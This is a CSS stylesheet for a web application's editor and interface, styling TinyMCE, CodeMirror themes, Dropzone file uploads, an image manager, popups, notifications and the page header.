.anim.searchResult { opacity: 0; transform: translate3d(580px, 0px, 0px); animation-name: searchResult; animation-duration: 220ms; animation-fill-mode: forwards; animation-timing-function: cubic-bezier(0.62, 0.28, 0.23, 0.99); }

@keyframes searchResult { 
  0% { opacity: 0; transform: translate3d(400px, 0px, 0px); }
  100% { opacity: 1; transform: translate3d(0px, 0px, 0px); }
}

@keyframes loadingBob { 
  0% { transform: translate3d(0px, 0px, 0px); }
  30% { transform: translate3d(0px, 0px, 0px); }
  50% { transform: translate3d(0px, -10px, 0px); }
  70% { transform: translate3d(0px, 0px, 0px); }
  100% { transform: translate3d(0px, 0px, 0px); }
}

@keyframes pointer { 
  0% { transform: translate3d(0px, 20px, 0px) scale3d(0, 0, 0); }
  100% { transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1); }
}

.anim.pointer { transform-origin: 50% 100%; animation-name: pointer; animation-duration: 180ms; animation-delay: 0s; animation-timing-function: cubic-bezier(0.62, 0.28, 0.23, 0.99); }

.mce-tinymce.mce-container.mce-fullscreen { position: fixed; top: 0px; height: 100%; width: 100%; max-width: 100%; z-index: 100; }

.mce-tinymce .mce-panel { background-color: rgb(255, 255, 255); }

html.dark-mode .mce-tinymce .mce-panel { background-color: rgb(51, 51, 51); }

.mce-tinymce .mce-btn { background-color: rgb(255, 255, 255); }

html.dark-mode .mce-tinymce .mce-btn { background-color: rgb(51, 51, 51); }

.mce-container-body.mce-flow-layout { text-align: center; }

@media screen and (max-width: 1000px) {
  .mce-container-body.mce-flow-layout { overflow-x: scroll; white-space: nowrap; }
}

.edit-area.flex > div > .mce-tinymce.mce-container.mce-panel { flex: 1 1 auto; flex-direction: column; align-items: stretch; margin: 0px -1px; display: flex !important; }

.edit-area.flex > div > .mce-tinymce.mce-container.mce-panel > .mce-container-body { flex: 1 1 auto; flex-direction: column; align-items: stretch; display: flex !important; }

.edit-area.flex > div > .mce-tinymce.mce-container.mce-panel > .mce-container-body > .mce-toolbar-grp { flex: 0 1 auto; }

.edit-area.flex > div > .mce-tinymce.mce-container.mce-panel > .mce-container-body > .mce-edit-area { flex: 1 1 auto; flex-direction: column; align-items: stretch; overflow: auto; display: flex !important; }

.edit-area.flex > div > .mce-tinymce.mce-container.mce-panel > .mce-container-body > .mce-edit-area iframe { flex: 1 1 0%; will-change: transform; }

.page-content.mce-content-body p { line-height: 1.6; }

.page-content.mce-content-body { padding-block: 1rem; outline: none; display: block; }

.page-content.mce-content-body > :last-child { margin-bottom: 3rem; }

.mce-colorbtn-trans { overflow: hidden; }

.mce-content-body .CodeMirrorContainer > .CodeMirror { pointer-events: none; }

.CodeMirror { font-family: monospace; height: 300px; color: rgb(0, 0, 0); direction: ltr; }

.CodeMirror-lines { padding: 4px 0px; }

.CodeMirror pre.CodeMirror-line, .CodeMirror pre.CodeMirror-line-like { padding: 0px 4px; }

.CodeMirror-scrollbar-filler, .CodeMirror-gutter-filler { background-color: rgb(255, 255, 255); }

.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background-color: rgb(247, 247, 247); white-space: nowrap; }

.CodeMirror-linenumber { padding: 0px 3px 0px 5px; min-width: 20px; text-align: right; color: rgb(153, 153, 153); white-space: nowrap; }

.CodeMirror-guttermarker { color: rgb(0, 0, 0); }

.CodeMirror-guttermarker-subtle { color: rgb(153, 153, 153); }

.CodeMirror-cursor { border-left: 1px solid rgb(0, 0, 0); border-right: none; width: 0px; }

.CodeMirror div.CodeMirror-secondarycursor { border-left: 1px solid silver; }

.cm-fat-cursor .CodeMirror-cursor { width: auto; background: rgb(119, 238, 119); border: 0px !important; }

.cm-fat-cursor div.CodeMirror-cursors { z-index: 1; }

.cm-fat-cursor-mark { background-color: rgba(20, 255, 20, 0.5); animation: 1.06s steps(1) 0s infinite normal none running blink; }

.cm-animate-fat-cursor { width: auto; border: 0px; animation: 1.06s steps(1) 0s infinite normal none running blink; background-color: rgb(119, 238, 119); }

@-webkit-keyframes blink { 
  50% { background-color: transparent; }
}

@keyframes blink { 
  50% { background-color: transparent; }
}

.cm-tab { display: inline-block; text-decoration: inherit; }

.CodeMirror-rulers { position: absolute; inset: -50px 0px 0px; overflow: hidden; }

.CodeMirror-ruler { border-left: 1px solid rgb(204, 204, 204); top: 0px; bottom: 0px; position: absolute; }

.cm-s-default .cm-header { color: blue; }

.cm-s-default .cm-quote { color: rgb(0, 153, 0); }

.cm-negative { color: rgb(221, 68, 68); }

.cm-positive { color: rgb(34, 153, 34); }

.cm-header, .cm-strong { font-weight: bold; }

.cm-em { font-style: italic; }

.cm-link { text-decoration: underline; }

.cm-strikethrough { text-decoration: line-through; }

.cm-s-default .cm-keyword { color: rgb(119, 0, 136); }

.cm-s-default .cm-atom { color: rgb(34, 17, 153); }

.cm-s-default .cm-number { color: rgb(17, 102, 68); }

.cm-s-default .cm-def { color: blue; }

.cm-s-default .cm-variable-2 { color: rgb(0, 85, 170); }

.cm-s-default .cm-variable-3, .cm-s-default .cm-type { color: rgb(0, 136, 85); }

.cm-s-default .cm-comment { color: rgb(170, 85, 0); }

.cm-s-default .cm-string { color: rgb(170, 17, 17); }

.cm-s-default .cm-string-2 { color: rgb(255, 85, 0); }

.cm-s-default .cm-meta { color: rgb(85, 85, 85); }

.cm-s-default .cm-qualifier { color: rgb(85, 85, 85); }

.cm-s-default .cm-builtin { color: rgb(51, 0, 170); }

.cm-s-default .cm-bracket { color: rgb(153, 153, 119); }

.cm-s-default .cm-tag { color: rgb(17, 119, 0); }

.cm-s-default .cm-attribute { color: rgb(0, 0, 204); }

.cm-s-default .cm-hr { color: rgb(153, 153, 153); }

.cm-s-default .cm-link { color: rgb(0, 0, 204); }

.cm-s-default .cm-error { color: red; }

.cm-invalidchar { color: red; }

.CodeMirror-composing { border-bottom: 2px solid; }

div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 187, 0); }

div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(170, 34, 34); }

.CodeMirror-matchingtag { background: rgba(255, 150, 0, 0.3); }

.CodeMirror-activeline-background { background: rgb(232, 242, 255); }

.CodeMirror { position: relative; overflow: hidden; background: rgb(255, 255, 255); }

.CodeMirror-scroll { margin-bottom: -50px; margin-right: -50px; padding-bottom: 50px; height: 100%; outline: none; position: relative; overflow: scroll !important; }

.CodeMirror-sizer { position: relative; border-right: 50px solid transparent; }

.CodeMirror-vscrollbar, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-gutter-filler { position: absolute; z-index: 6; display: none; outline: none; }

.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden scroll; }

.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: scroll hidden; }

.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }

.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }

.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; min-height: 100%; z-index: 3; }

.CodeMirror-gutter { white-space: normal; height: 100%; display: inline-block; vertical-align: top; margin-bottom: -50px; }

.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: none !important; border: none !important; }

.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }

.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }

.CodeMirror-gutter-wrapper ::selection { background-color: transparent; }

.CodeMirror-lines { cursor: text; min-height: 1px; }

.CodeMirror pre.CodeMirror-line, .CodeMirror pre.CodeMirror-line-like { border-radius: 0px; border-width: 0px; background: transparent; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; line-height: inherit; color: inherit; z-index: 2; position: relative; overflow: visible; -webkit-tap-highlight-color: transparent; font-variant-ligatures: contextual; }

.CodeMirror-wrap pre.CodeMirror-line, .CodeMirror-wrap pre.CodeMirror-line-like { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }

.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }

.CodeMirror-linewidget { position: relative; z-index: 2; padding: 0.1px; }

.CodeMirror-rtl pre { direction: rtl; }

.CodeMirror-code { outline: none; }

.CodeMirror-scroll, .CodeMirror-sizer, .CodeMirror-gutter, .CodeMirror-gutters, .CodeMirror-linenumber { box-sizing: content-box; }

.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }

.CodeMirror-cursor { position: absolute; pointer-events: none; }

.CodeMirror-measure pre { position: static; }

div.CodeMirror-cursors { visibility: hidden; position: relative; z-index: 3; }

div.CodeMirror-dragcursors { visibility: visible; }

.CodeMirror-focused div.CodeMirror-cursors { visibility: visible; }

.CodeMirror-selected { background: rgb(217, 217, 217); }

.CodeMirror-focused .CodeMirror-selected { background: rgb(215, 212, 240); }

.CodeMirror-crosshair { cursor: crosshair; }

.CodeMirror-line::selection, .CodeMirror-line > span::selection, .CodeMirror-line > span > span::selection { background: rgb(215, 212, 240); }

.cm-searching { background-color: rgba(255, 255, 0, 0.4); }

.cm-force-border { padding-right: 0.1px; }

@media print {
  .CodeMirror div.CodeMirror-cursors { visibility: hidden; }
}

.cm-tab-wrap-hack::after { content: ""; }

span.CodeMirror-selectedtext { background: none; }

.cm-s-darcula { font-family: Consolas, Menlo, Monaco, "Lucida Console", "Liberation Mono", "DejaVu Sans Mono", "Bitstream Vera Sans Mono", "Courier New", monospace, serif; }

.cm-s-darcula.CodeMirror { background: rgb(43, 43, 43); color: rgb(169, 183, 198); }

.cm-s-darcula span.cm-meta { color: rgb(187, 181, 41); }

.cm-s-darcula span.cm-number { color: rgb(104, 151, 187); }

.cm-s-darcula span.cm-keyword { color: rgb(204, 120, 50); line-height: 1em; font-weight: bold; }

.cm-s-darcula span.cm-def { color: rgb(169, 183, 198); font-style: italic; }

.cm-s-darcula span.cm-variable { color: rgb(169, 183, 198); }

.cm-s-darcula span.cm-variable-2 { color: rgb(169, 183, 198); }

.cm-s-darcula span.cm-variable-3 { color: rgb(152, 118, 170); }

.cm-s-darcula span.cm-type { color: rgb(170, 187, 204); font-weight: bold; }

.cm-s-darcula span.cm-property { color: rgb(255, 198, 109); }

.cm-s-darcula span.cm-operator { color: rgb(169, 183, 198); }

.cm-s-darcula span.cm-string { color: rgb(106, 135, 89); }

.cm-s-darcula span.cm-string-2 { color: rgb(106, 135, 89); }

.cm-s-darcula span.cm-comment { color: rgb(97, 161, 81); font-style: italic; }

.cm-s-darcula span.cm-link { color: rgb(204, 120, 50); }

.cm-s-darcula span.cm-atom { color: rgb(204, 120, 50); }

.cm-s-darcula span.cm-error { color: rgb(188, 63, 60); }

.cm-s-darcula span.cm-tag { color: rgb(98, 151, 85); font-weight: bold; font-style: italic; text-decoration: underline; }

.cm-s-darcula span.cm-attribute { color: rgb(104, 151, 187); }

.cm-s-darcula span.cm-qualifier { color: rgb(106, 135, 89); }

.cm-s-darcula span.cm-bracket { color: rgb(169, 183, 198); }

.cm-s-darcula span.cm-builtin { color: rgb(255, 158, 89); }

.cm-s-darcula span.cm-special { color: rgb(255, 158, 89); }

.cm-s-darcula span.cm-matchhighlight { color: rgb(255, 255, 255); background-color: rgba(50, 89, 48, 0.7); font-weight: normal; }

.cm-s-darcula span.cm-searching { color: rgb(255, 255, 255); background-color: rgba(61, 115, 59, 0.7); font-weight: normal; }

.cm-s-darcula .CodeMirror-cursor { border-left: 1px solid rgb(169, 183, 198); }

.cm-s-darcula .CodeMirror-activeline-background { background: rgb(50, 50, 50); }

.cm-s-darcula .CodeMirror-gutters { background: rgb(49, 51, 53); border-right: 1px solid rgb(49, 51, 53); }

.cm-s-darcula .CodeMirror-guttermarker { color: rgb(255, 238, 128); }

.cm-s-darcula .CodeMirror-guttermarker-subtle { color: rgb(208, 208, 208); }

.cm-s-darcula .CodeMirrir-linenumber { color: rgb(96, 99, 102); }

.cm-s-darcula .CodeMirror-matchingbracket { background-color: rgb(59, 81, 77); font-weight: bold; color: rgb(255, 239, 40) !important; }

.cm-s-darcula div.CodeMirror-selected { background: rgb(33, 66, 131); }

.CodeMirror-hints.darcula { font-family: Menlo, Monaco, Consolas, "Courier New", monospace; color: rgb(156, 158, 158); background-color: rgb(59, 62, 63) !important; }

.CodeMirror-hints.darcula .CodeMirror-hint-active { background-color: rgb(73, 77, 78) !important; color: rgb(156, 158, 158) !important; }

.CodeMirror, .CodeMirror pre { font-size: 12px; }

.CodeMirror { font-size: 12px; height: auto; margin-bottom: 24px; border: 1px solid rgb(221, 221, 221); }

html.dark-mode .CodeMirror { border-color: rgb(17, 17, 17); }

.CodeMirror pre::after { display: none; }

html.dark-mode .CodeMirror pre { background-color: transparent; }

.cm-s-mdn-like .CodeMirror-gutters { background: rgb(248, 248, 248); border-left: 0px; color: rgb(51, 51, 51); }

.code-fill .CodeMirror { position: absolute; top: 0px; bottom: 0px; left: 0px; width: 100%; height: 100%; margin-bottom: 0px; }

.CodeMirror-copy { position: absolute; top: -1px; right: -1px; border: 1px solid rgb(221, 221, 221); background-color: rgb(238, 238, 238); fill: rgb(68, 68, 68); padding: 6px; line-height: 0; cursor: pointer; z-index: 5; user-select: none; opacity: 0; pointer-events: none; }

html.dark-mode .CodeMirror-copy { background-color: rgb(51, 51, 51); }

html.dark-mode .CodeMirror-copy { border-color: rgb(68, 68, 68); }

html.dark-mode .CodeMirror-copy { fill: rgb(136, 136, 136); }

.CodeMirror-copy svg { transition: all 240ms ease-in 0s; transform: translateY(0px); }

.CodeMirror-copy.success { background-color: rgb(20, 171, 29); }

.CodeMirror-copy.success svg { fill: rgb(255, 255, 255); transform: translateY(-3px); }

.CodeMirror:hover .CodeMirror-copy { user-select: all; opacity: 1; pointer-events: all; }

[notification] { position: fixed; top: 0px; right: 0px; margin: 32px; padding: 16px 24px; background-color: rgb(255, 255, 255); border-radius: 4px; border-inline-start: 6px solid currentcolor; box-shadow: rgba(22, 22, 22, 0.2) 0px 1px 6px 1px; z-index: 999999; cursor: pointer; max-width: 360px; transition: transform 280ms ease-in-out 0s; transform: translateX(580px); display: grid; grid-template-columns: 42px 1fr 12px; color: rgb(68, 68, 68); font-weight: 700; }

html.dark-mode [notification] { background-color: rgb(68, 68, 68); }

[notification] span, [notification] svg { vertical-align: middle; place-self: center; }

[notification] svg { width: 2.8rem; height: 2.8rem; padding-inline-end: 12px; fill: currentcolor; }

[notification] .dismiss { margin-top: -8px; }

[notification] .dismiss svg { height: 1rem; color: rgb(68, 68, 68); }

html.dark-mode [notification] .dismiss svg { color: rgb(136, 136, 136); }

[notification] span { vertical-align: middle; line-height: 1.3; }

html.dark-mode [notification] span { color: rgb(187, 187, 187); }

[notification].pos { color: rgb(15, 125, 21); }

[notification].neg { color: rgb(171, 15, 14); }

[notification].warning { color: rgb(207, 77, 3); }

[notification].showing { transform: translateX(0px); }

[notification].showing:hover { transform: translate3d(0px, -2px, 0px); }

[chapter-toggle] { cursor: pointer; margin: 0px; transition: all 180ms ease-in-out 0s; user-select: none; }

[chapter-toggle] svg[data-icon="caret-right"] { margin-inline-end: 0px; font-size: 1rem; transition: all 180ms ease-in-out 0s; transform: rotate(0deg); transform-origin: 50% 50%; }

[chapter-toggle].open svg[data-icon="caret-right"] { transform: rotate(90deg); }

[chapter-toggle] svg[data-icon="caret-right"] + * { margin-inline-start: 6px; }

[overlay], .popup-background { background-color: rgba(0, 0, 0, 0.333); position: fixed; z-index: 95536; width: 100%; height: 100%; min-width: 100%; min-height: 100%; inset: 0px; align-items: center; justify-content: center; display: none; }

html.dark-mode [overlay], html.dark-mode .popup-background { background-color: rgba(0, 0, 0, 0.6); }

.popup-body-wrap { display: flex; }

.popup-body { background-color: rgb(255, 255, 255); max-height: 90%; max-width: 1200px; width: 90%; height: auto; margin: 2% auto; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 15px 0px; overflow: hidden; z-index: 999; display: flex; flex-direction: column; }

html.dark-mode .popup-body { background-color: rgb(51, 51, 51); }

.popup-body.small { margin: 2% auto; width: 800px; max-width: 90%; }

.popup-body::before { display: flex; align-self: flex-start; }

.popup-body .popup-content { overflow-y: auto; }

.popup-body:focus { outline: 0px; }

.popup-footer button, .popup-header-close { position: absolute; top: 0px; right: 0px; margin: 0px; height: 40px; border-radius: 0px; box-shadow: none; }

.popup-footer button:active, .popup-header-close:active { outline: 0px; }

.popup-header-close { background-color: transparent; border: 0px; color: rgb(255, 255, 255); font-size: 16px; padding: 0px 16px; }

.popup-header, .popup-footer { position: relative; height: 40px; display: block !important; flex: 0 0 auto !important; }

.popup-header .popup-title, .popup-footer .popup-title { color: rgb(255, 255, 255); padding: 8px 16px; }

body.flexbox-support #entity-selector-wrap .popup-body .form-group { height: 444px; min-height: 444px; }

#entity-selector-wrap .popup-body .form-group { margin: 0px; }

.popup-body .entity-selector-container { flex: 1 1 0%; }

.image-manager-body { min-height: 70vh; }

.dropzone-container { position: relative; background-color: rgb(238, 238, 238); background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%23a9a9a9' fill-opacity='0.52' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E"); }

html.dark-mode .dropzone-container { background-color: rgb(34, 34, 34); }

.image-manager-list .image { display: block; position: relative; border-radius: 0px; float: left; margin: 0px; cursor: pointer; width: 16.6667%; height: auto; border-color: rgb(221, 221, 221); box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px; transition: all 160ms cubic-bezier(0.4, 0, 1, 1) 0s; overflow: hidden; }

html.dark-mode .image-manager-list .image { border-color: rgb(0, 0, 0); }

.image-manager-list .image.selected { transform: scale3d(0.92, 0.92, 0.92); outline: currentcolor solid 2px; }

.image-manager-list .image img { width: 100%; max-width: 100%; display: block; }

.image-manager-list .image .image-meta { position: absolute; width: 100%; bottom: 0px; left: 0px; color: rgb(238, 238, 238); background-color: rgba(0, 0, 0, 0.4); font-size: 10px; padding: 3px 4px; }

.image-manager-list .image .image-meta span { display: block; }

@media screen and (max-width: 1100px) {
  .image-manager-list .image { width: 25%; }
}

@media screen and (max-width: 880px) {
  .image-manager-list .image .image-meta { display: none; }
}

.image-manager .load-more { display: block; text-align: center; background-color: rgb(238, 238, 238); padding: 12px 16px; color: rgb(170, 170, 170); clear: both; font-size: 20px; cursor: pointer; font-style: italic; }

html.dark-mode .image-manager .load-more { background-color: rgb(68, 68, 68); }

.image-manager .loading-container { text-align: center; }

.image-manager-sidebar { width: 300px; overflow: hidden auto; border-inline-start: 1px solid rgb(221, 221, 221); border-color: rgb(221, 221, 221); }

html.dark-mode .image-manager-sidebar { border-color: rgb(0, 0, 0); }

.image-manager-sidebar .inner { min-height: auto; padding: 16px; }

.image-manager-sidebar img { max-width: 100%; max-height: 180px; display: block; margin: 0px auto 16px; box-shadow: rgba(76, 76, 76, 0.3) 0px 1px 21px 1px; }

.image-manager-sidebar .image-manager-viewer { height: 196px; display: flex; align-items: center; justify-content: center; }

.image-manager-sidebar .image-manager-viewer a { display: inline-block; }

.image-manager-sidebar .dropzone-container { border-bottom: 1px solid rgb(221, 221, 221); border-top-color: rgb(221, 221, 221); border-right-color: rgb(221, 221, 221); border-left-color: rgb(221, 221, 221); }

html.dark-mode .image-manager-sidebar .dropzone-container { border-color: rgb(0, 0, 0); }

.image-manager-list { overflow-y: scroll; flex: 1 1 0%; }

.image-manager-content { display: flex; flex-direction: column; flex: 1 1 0%; }

.image-manager-content .container { width: 100%; }

.image-manager-content .full-tab { text-align: center; }

.image-manager .corner-button { margin: 0px; border-radius: 0px; padding: 16px; }

.dz-message { font-size: 1em; line-height: 2.85; font-style: italic; color: rgb(136, 136, 136); text-align: center; cursor: pointer; padding: 24px 16px; transition: all 120ms ease-in-out 0s; }

.dz-drag-hover .dz-message { background-color: rgb(16, 126, 210); color: rgb(238, 238, 238); }

@keyframes passing-through { 
  0% { opacity: 0; transform: translateY(40px); }
  30%, 70% { opacity: 1; transform: translateY(0px); }
  100% { opacity: 0; transform: translateY(-40px); }
}

@keyframes slide-in { 
  0% { opacity: 0; transform: translateY(40px); }
  30% { opacity: 1; transform: translateY(0px); }
}

@keyframes pulse { 
  0% { transform: scale(1); }
  10% { transform: scale(1.1); }
  20% { transform: scale(1); }
}

.dropzone, .dropzone * { box-sizing: border-box; }

.dz-preview { position: relative; display: inline-block; vertical-align: top; margin: 12px; min-height: 80px; }

.dz-preview:hover { z-index: 1000; }

.dz-preview:hover .dz-details { opacity: 1; }

.dz-preview.dz-file-preview .dz-image { border-radius: 4px; background: rgb(233, 233, 233); }

.dz-preview.dz-file-preview .dz-details { opacity: 1; }

.dz-preview.dz-image-preview { background: rgb(255, 255, 255); }

.dz-preview.dz-image-preview .dz-details { transition: opacity 0.2s linear 0s; }

.dz-preview .dz-remove { font-size: 13px; text-align: center; display: block; cursor: pointer; border: none; margin-top: 3px; }

.dz-preview .dz-remove:hover { text-decoration: underline; }

.dz-preview:hover .dz-details { opacity: 1; }

.dz-preview .dz-details { z-index: 20; position: absolute; top: 0px; left: 0px; opacity: 0; font-size: 10px; min-width: 100%; max-width: 100%; padding: 6px 3px; text-align: center; color: rgba(0, 0, 0, 0.9); line-height: 150%; }

.dz-preview .dz-details .dz-size { margin-bottom: 0.5em; font-size: 12px; }

.dz-preview .dz-details .dz-filename { white-space: nowrap; }

.dz-preview .dz-details .dz-filename:hover span { border: 1px solid rgba(200, 200, 200, 0.8); background-color: rgba(255, 255, 255, 0.8); }

.dz-preview .dz-details .dz-filename:not(:hover) { overflow: hidden; text-overflow: ellipsis; }

.dz-preview .dz-details .dz-filename:not(:hover) span { border: 1px solid transparent; }

.dz-preview .dz-details .dz-filename span { background-color: rgba(255, 255, 255, 0.4); padding: 0px 0.4em; border-radius: 3px; }

.dz-preview:hover .dz-image img { filter: blur(8px); }

.dz-preview .dz-image { border-radius: 4px; overflow: hidden; width: 80px; height: 80px; position: relative; display: block; z-index: 10; }

.dz-preview .dz-image img { display: block; }

.dz-preview.dz-success .dz-success-mark { animation: 3s cubic-bezier(0.77, 0, 0.175, 1) 0s 1 normal none running passing-through; }

.dz-preview.dz-error .dz-error-mark { opacity: 1; animation: 3s cubic-bezier(0.77, 0, 0.175, 1) 0s 1 normal none running slide-in; }

.dz-preview .dz-success-mark, .dz-preview .dz-error-mark { pointer-events: none; opacity: 0; z-index: 1001; position: absolute; display: block; top: 50%; left: 50%; margin-inline-start: -27px; margin-top: -35px; }

.dz-preview .dz-success-mark svg, .dz-preview .dz-error-mark svg { display: block; width: 54px; height: 54px; }

.dz-preview.dz-processing .dz-progress { opacity: 1; transition: all 0.2s linear 0s; }

.dz-preview.dz-complete .dz-progress { opacity: 0; transition: opacity 0.4s ease-in 0s; }

.dz-preview:not(.dz-processing) .dz-progress { animation: 6s ease 0s infinite normal none running pulse; }

.dz-preview .dz-progress { opacity: 1; z-index: 1000; pointer-events: none; position: absolute; height: 16px; left: 50%; top: 50%; margin-top: -8px; width: 80px; margin-inline-start: -40px; background: rgba(255, 255, 255, 0.9); transform: scale(1); border-radius: 8px; overflow: hidden; }

.dz-preview .dz-progress .dz-upload { background: linear-gradient(rgb(102, 102, 102), rgb(68, 68, 68)); position: absolute; top: 0px; left: 0px; bottom: 0px; width: 0px; transition: width 300ms ease-in-out 0s; }

.dz-preview.dz-error .dz-error-message { display: block; }

.dz-preview.dz-error .dz-image:hover ~ .dz-error-message, .dz-preview.dz-error .dz-details:hover ~ .dz-error-message { opacity: 1; pointer-events: auto; }

.dz-preview .dz-error-message { pointer-events: none; z-index: 1000; position: absolute; display: none; opacity: 0; transition: opacity 0.3s ease 0s; border-radius: 4px; font-size: 12px; line-height: 1.2; top: 88px; left: -12px; width: 160px; background: rgb(171, 15, 14); padding: 6px; color: rgb(255, 255, 255); }

.dz-preview .dz-error-message::after { content: ""; position: absolute; top: -6px; left: 44px; width: 0px; height: 0px; border-inline: 6px solid transparent; border-bottom: 6px solid rgb(171, 15, 14); }

.tab-container .nav-tabs { text-align: start; border-bottom: 1px solid rgb(221, 221, 221); border-top-color: rgb(221, 221, 221); border-right-color: rgb(221, 221, 221); border-left-color: rgb(221, 221, 221); margin-bottom: 16px; }

html.dark-mode .tab-container .nav-tabs { border-color: rgb(68, 68, 68); }

.tab-container .nav-tabs .tab-item { padding: 12px; color: rgb(102, 102, 102); }

html.dark-mode .tab-container .nav-tabs .tab-item { color: rgb(153, 153, 153); }

.tab-container .nav-tabs .tab-item.selected { border-bottom-width: 3px; }

.nav-tabs { text-align: center; }

.nav-tabs a, .nav-tabs .tab-item { padding: 16px; display: inline-block; color: rgb(102, 102, 102); cursor: pointer; border-right: 1px solid rgba(0, 0, 0, 0.1); border-bottom: 2px solid transparent; }

html.dark-mode .nav-tabs a, html.dark-mode .nav-tabs .tab-item { color: rgb(153, 153, 153); }

.nav-tabs a.selected, .nav-tabs .tab-item.selected { border-bottom: 2px solid var(--color-primary); }

.nav-tabs a:last-child, .nav-tabs .tab-item:last-child { border-right: 0px; }

.image-picker .none { display: none; }

.code-editor .CodeMirror { height: 400px; }

.code-editor .lang-options { max-width: 540px; margin-bottom: 12px; }

.code-editor .lang-options a { margin-inline-end: 6px; text-decoration: underline; }

@media screen and (max-width: 880px) {
  .code-editor .lang-options { max-width: 100%; }
  .code-editor .CodeMirror { height: 200px; }
}

.comment-box { border-radius: 4px; border: 1px solid rgb(221, 221, 221); background-color: rgb(255, 255, 255); }

html.dark-mode .comment-box { border-color: rgb(0, 0, 0); }

html.dark-mode .comment-box { background-color: rgb(34, 34, 34); }

.comment-box .content { font-size: 0.666em; }

.comment-box .content p, .comment-box .content ul, .comment-box .content ol { font-size: 14px; margin: 0.5em 0px; }

.comment-box .actions { opacity: 0; transition: opacity 120ms ease-in-out 0s; }

.comment-box:hover .actions, .comment-box:focus-within .actions { opacity: 1; }

.comment-box .header .meta img, .comment-box .header .meta a, .comment-box .header .meta span { display: inline-block; vertical-align: top; }

.comment-box .header .meta a, .comment-box .header .meta span { padding: 3px 0px; line-height: 1.6; }

.comment-box .header .meta a { color: rgb(102, 102, 102); }

.comment-box .header .meta span { padding-inline-start: 3px; }

.comment-box .header .text-muted { color: rgb(153, 153, 153); }

#tag-manager .drag-card { max-width: 500px; }

.permissions-table [permissions-table-toggle-all-in-row] { display: none; }

.permissions-table tr:hover [permissions-table-toggle-all-in-row] { display: inline; }

.template-item { cursor: pointer; position: relative; }

.template-item:hover, .template-item .template-item-actions button:hover { background-color: rgb(242, 242, 242); }

.template-item .template-item-actions { position: absolute; top: 0px; right: 0px; width: 50px; height: 100%; display: flex; flex-direction: column; border-inline-start: 1px solid rgb(221, 221, 221); }

.template-item .template-item-actions button { cursor: pointer; flex: 1 1 0%; background: rgb(255, 255, 255); border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(221, 221, 221); }

.template-item .template-item-actions button:first-child { border-top: 0px; }

.dropdown-search-dropdown { box-shadow: rgba(76, 76, 76, 0.26) 0px 1px 3px 1px; overflow: hidden; min-height: 100px; width: 240px; display: none; position: absolute; z-index: 80; right: -16px; }

html[dir="rtl"] .dropdown-search-dropdown { right: auto; left: -16px; }

.dropdown-search-dropdown .dropdown-search-search .svg-icon { position: absolute; left: 12px; top: 11px; fill: rgb(136, 136, 136); pointer-events: none; }

html[dir="rtl"] .dropdown-search-dropdown .dropdown-search-search .svg-icon { right: 12px; left: auto; }

.dropdown-search-dropdown .dropdown-search-list { max-height: 400px; overflow-y: scroll; text-align: start; }

.dropdown-search-dropdown .dropdown-search-item { padding: 12px 16px; }

.dropdown-search-dropdown .dropdown-search-item:hover, .dropdown-search-dropdown .dropdown-search-item:focus { background-color: rgb(242, 242, 242); text-decoration: none; }

.dropdown-search-dropdown input { padding-inline-start: 32px; border-radius: 0px; border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: rgb(221, 221, 221); }

@media screen and (max-width: 880px) {
  .dropdown-search-dropdown { position: fixed; right: auto; left: 16px; }
  .dropdown-search-dropdown .dropdown-search-list { max-height: 240px; }
}

.custom-select-input { max-width: 280px; border: 1px solid rgb(212, 212, 212); border-radius: 3px; }

header .grid { grid-template-columns: minmax(max-content, 2fr) 1fr minmax(max-content, 2fr); }

@media screen and (max-width: 1000px) {
  header .grid { grid-template-columns: 1fr; row-gap: 0px; }
}

header { position: relative; display: block; z-index: 11; top: 0px; color: rgb(250, 250, 250); border-bottom: 1px solid rgb(221, 221, 221); box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 6px -1px; padding: 3px 0px; }

html.dark-mode header { border-bottom-color: rgb(0, 0, 0); }

html.dark-mode header { filter: saturate(0.8) brightness(0.8); }

header .links { display: inline-block; vertical-align: top; }

header .links a { display: inline-block; padding: 16px; color: rgb(255, 255, 255); }

header .dropdown-container { padding-inline: 16px 0px; }

header .avatar, header .user-name { display: inline-block; }

header .avatar { width: 30px; height: 30px; }

header .user-name { vertical-align: top; position: relative; display: inline-block; cursor: pointer; }

header .user-name > * { vertical-align: top; }

header .user-name > span { padding-inline-start: 6px; display: inline-block; padding-top: 3px; }

header .user-name > svg { padding-top: 4px; font-size: 18px; }

@media screen and (min-width: 1000px) and (max-width: 1100px) {
  header .user-name { padding-inline-start: 6px; }
  header .user-name .name { display: none; }
}

.header *, .primary-background * { outline-color: rgb(255, 255, 255); }

header .search-box { display: inline-block; margin-top: 10px; }

